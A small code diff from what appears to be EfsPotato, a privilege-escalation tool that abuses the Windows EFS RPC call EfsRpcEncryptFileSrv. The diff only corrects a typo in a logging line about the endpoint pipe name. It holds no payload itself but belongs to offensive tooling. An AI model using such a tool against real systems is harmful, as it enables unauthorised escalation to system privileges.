@@ -236,7 +236,7 @@ namespace EfsPotato.Library
                 {
                     Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
                     Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
-                    Console.WriteLine("    [*] Endpoint Pipe Name : \\piep\\{0}", Globals.EndpointPipeName);
+                    Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);
 
                     rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
                     RpcHelpers.CloseBindingHandle(ref hBinding);
